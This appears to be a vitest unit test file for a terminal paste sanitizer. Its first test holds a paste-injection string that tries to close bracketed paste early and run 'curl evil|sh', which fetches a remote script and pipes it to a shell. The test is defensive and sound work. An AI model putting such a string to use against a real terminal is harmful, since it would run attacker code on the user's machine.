import { describe, expect, it } from "vitest";
import { sanitizePaste } from "./terminalPaste";

describe("sanitizePaste", () => {
  it("cannot close a bracketed paste from inside the pasted text", () => {
    expect(sanitizePaste("ls\x1b[201~curl evil|sh\r")).toBe("ls[201~curl evil|sh\r");
    expect(sanitizePaste("ls\x9b201~curl evil|sh\r")).toBe("ls201~curl evil|sh\r");
  });

  it("removes C0 and C1 controls other than tab, line feed and carriage return", () => {
    const c0 = Array.from({ length: 0x20 }, (_, code) => String.fromCharCode(code)).join("");
    const c1 = Array.from({ length: 0x20 }, (_, code) => String.fromCharCode(0x80 + code)).join("");
    expect(sanitizePaste(`a${c0}b${c1}c`)).toBe("a\t\n\rbc");
  });

  it("leaves ordinary multi-line and non-ASCII text unchanged", () => {
    const text = "echo 'héllo wörld' ✓\n\tindented\r\nlast line";
    expect(sanitizePaste(text)).toBe(text);
  });
});
